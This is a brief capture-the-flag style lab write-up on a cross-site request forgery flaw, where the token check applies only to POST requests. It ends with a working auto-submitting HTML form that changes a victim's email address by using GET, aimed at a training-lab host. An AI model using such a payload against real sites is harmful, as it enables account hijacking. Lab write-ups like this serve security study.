# Lab: CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

## CSRF
* 題目說改一下 requests method 可能會有不一樣的地方，所以用 post 跟 get 各試了一次，發現用 get 送 data 不會驗證 CSRF token 
```
<form method="get" action="https://ac8c1f581f436adfc01e670c0004007f.web-security-academy.net/my-account/change-email">
<input name="email" value="exploit@email.com" type="hidden">
<input name="csrf" value="ioZiPM379q17NVPDQMbP4neqW8YdGlxT" type="hidden">
</form>
<script>
document.forms[0].submit();
</script>
```